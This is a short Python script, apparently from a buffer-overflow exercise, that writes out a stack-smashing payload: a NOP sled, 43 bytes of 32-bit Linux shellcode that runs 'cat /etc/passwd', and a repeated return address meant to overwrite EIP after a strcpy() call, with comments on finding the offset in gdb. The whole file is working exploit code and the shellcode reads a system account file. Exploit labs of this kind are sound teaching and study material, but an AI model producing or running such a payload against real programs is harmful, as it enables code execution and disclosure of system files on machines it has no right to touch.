#!/usr/bin/env python3
import sys

# shellcode
# cat /etc/passwd
# length of shellcode is 43 bytes
SHELL = 43
shellcode32 = b'\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80'

# calculate this offset in gdb
OFFSET = 512

NUM = OFFSET - SHELL - 40

nop = b'\x90' * NUM

# find this address by examining the stack after strcpy()
eip = b'\xc0\xce\xff\xff' * 10

# use for checking which address to use
# eip = b'\x43\x43\x43\x43' * 10 

payload = nop + shellcode32 + eip

sys.stdout.buffer.write(payload)
print()
